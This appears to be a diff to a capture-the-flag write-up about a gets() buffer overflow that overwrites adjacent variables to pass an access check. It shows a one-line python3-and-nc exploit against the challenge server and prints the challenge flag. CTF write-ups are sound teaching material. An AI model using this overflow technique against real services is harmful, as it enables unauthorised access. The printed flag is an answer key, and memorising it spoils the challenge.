@@ -17,6 +17,6 @@ int check(){
 For this piece of code we can see that after `input`, `pass` and `access` were initialized and `gets()` is used to get the `input`.\
 If we overflow `input` we can overwrite `pass` and `access` to pass the `if(access)` to get our flag.
 
-**Exploit:** python3 -c 'print(80*"a")' | nc lac.tf 31121
+**Exploit:** `python3 -c 'print(80*"a")' | nc lac.tf 31121`
 
-**Flag:** lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}
+**Flag:** `lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}`
